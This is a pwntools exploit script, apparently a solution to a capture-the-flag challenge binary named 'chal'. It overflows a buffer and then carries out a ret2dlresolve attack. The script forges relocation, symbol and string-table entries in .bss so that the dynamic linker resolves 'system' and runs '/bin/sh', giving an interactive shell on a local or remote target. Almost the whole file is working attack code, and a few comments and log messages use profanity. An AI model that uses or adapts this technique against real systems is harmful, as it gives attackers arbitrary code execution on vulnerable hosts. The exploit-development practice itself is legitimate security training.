from pwn import *
import sys
from ctypes import CDLL

context.terminal = "kitty"
# context.gdbinit = "/opt/pwndbg/gdbinit"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./chal"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    # # b *main+25
    b *0x401026
    break main
    break puts 
    c
    break *main+25
    set follow-fork-mode parent
    b dl-runtime.c:57
    c
    break system
'''

libcx = CDLL("libc.so.6")
# now = int(floor(time.time()))
# libcx.srand(now)
# print(libcx.rand())

def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

sall = 1

def inject_toxic_feild():
    dynsym = 0x004003e0
    dynstr = 0x00400470
    relaplt = 0x00400590
    bss = 0x00404008
    injectable = bss - 8 + 0x930 + sall
    print(hex(injectable))
    main_stub = 0x40112a
    gets_plt = 0x404000

    # writing parameter
    log.info(f"fucking injectable {hex(injectable)}")
    toxic_feild = p64( int((injectable - relaplt ) / 0x18 ))     # reloc index
    # toxic_feild += p64(elf.sym.main)
    toxic_feild += p64(0x0000000000401127)
    toxic_feild += p64(injectable + (0x18 * 2) + 0xd - 9)
    toxic_feild += p64(0x40112a)

    toxic_feild += cyclic(0xc6 - 0x18 - 4 + 7  - (8 * 2) - sall - 8) 

    ## starting Elf_Rela
    # definition
    toxic_feild += p64(elf.got.gets)
    toxic_feild += p64((int((injectable + (0x18 * 1) - dynsym ) / 0x18) << 32) | 7 )
    toxic_feild += p64(0)                         # padding
    # ELF_Sym
    # toxic_feild += p64(injectable + (0x18 * 2) - dynstr + 8)
    toxic_feild += p64(17648)
    toxic_feild += p16(0x0003)
    toxic_feild += b"\x00" * (0x18 - 10)
    # dynstr
    toxic_feild += b"/bin/sh\x00"
    toxic_feild += b"system\x00"

    return (toxic_feild)


def exploit():
    log.info("alright")
    main_stub = 0x40112a
    bss = 0x00404008
    plt = 0x401020
    ret = 0x0000000000401000
    total_injectable = bss - 32 + (0x930 - 0xc6)+ sall          # these are not the toxic feild, its shifted a bit to fucking save another address
                                                # real toxic feild will be in inject toxic feild
    # badtrip 0x4043a0
    pp.sendline(cyclic(13) + p64(total_injectable  - 8 + 0xd) + p64(main_stub))
    payload = cyclic(13) + p64(bss - 8 + (0x930 - 0xc6)) + p64(ret) + p64(0x401020) 
    payload += inject_toxic_feild()
    pp.sendline(payload)
    pp.interactive()
    

if (args.REMOTE):
    libc = ELF("./libc.so.6")
else:
    libc = ELF("./libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
